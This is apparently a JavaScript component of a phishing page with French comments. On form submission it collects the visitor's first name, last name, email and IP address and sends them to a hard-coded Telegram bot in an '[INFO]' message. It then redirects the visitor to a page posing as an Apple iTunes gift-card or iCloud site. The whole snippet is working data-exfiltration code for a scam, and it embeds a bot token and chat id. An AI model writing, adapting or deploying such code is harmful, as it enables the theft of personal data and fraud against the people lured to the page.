document.getElementById('submitButton').addEventListener('click', async function(event) {
    event.preventDefault(); // Empêcher le rechargement de la page

    var formData = new FormData(document.getElementById('myForm'));

    // Récupérer l'adresse IP du client
    const ipResponse = await fetch('https://api64.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const clientIP = ipData.ip;

    const response = await fetch('https://api.telegram.org/bot6376772615:AAFV14FNDqb2_5HFigeGnXzi_kIZGWjxHeI/sendMessage', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: '-913533320',
            text: `-------[INFO]-------
firstname: ${formData.get('firstname')}
lastname: ${formData.get('lastname')}
email: ${formData.get('email')}
IP: ${clientIP}`,
        }),
    });

    const responseData = await response.json();
    console.log(responseData);

    setTimeout(function() {
        window.location.href = 'https://apple-gifts.vercel.app/Itunes-card/page/icloud.html';
    } );
});
